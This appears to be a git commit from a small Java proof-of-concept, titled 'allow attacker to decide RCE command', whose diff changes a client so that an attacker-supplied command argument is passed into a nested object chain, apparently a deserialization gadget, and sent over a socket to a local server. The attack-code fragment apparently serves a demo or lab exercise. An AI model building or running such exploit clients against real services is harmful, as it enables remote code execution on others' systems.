70db894599621353e96fdd1542a617ab44b2965b
James Chiu <james041200@gmail.com>
2020-11-25 20:55:23 +0800

    =allow attacker to decide RCE command

--- src/client.java
+++ src/client.java
@@ -10,7 +10,7 @@ public class client {
     public static void main(String[] args) throws Exception {
         // user user1 = new user(args[0]);
         // user user1 = new user(args[0], Integer.parseInt(args[1]));
-        one One = new one(new two(new three("google-chrome")));
+        one One = new one(new two(new three(args[1])));
         String hostname = "127.0.0.1";
         int port = Integer.parseInt(args[0]);
         Socket clientSocket = new Socket(hostname, port);
